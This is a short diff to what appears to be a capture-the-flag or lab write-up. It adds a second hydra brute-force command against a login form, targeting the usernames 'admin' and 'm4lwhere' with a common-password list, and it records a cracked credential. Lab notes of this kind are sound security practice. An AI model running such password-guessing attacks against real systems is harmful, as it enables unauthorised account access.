@@ -24,7 +24,10 @@ Probably try cred stuffing?
 #### Cred stuffing
 
     hydra -l admin -P ~/Git/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt $VICTIM -V http-form-post '/login.php:username=^USER^&password=^PASS^:S=Location' -t 64
-    
+
+    hydra -l m4lwhere -P ~/Git/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt $VICTIM -V http-form-post '/login.php:username=^USER^&password=^PASS^:S=Location' -t 64
+
+
 Apparently it worked. `admin:asdfasdf`. Wow!
 
 ## Next steps
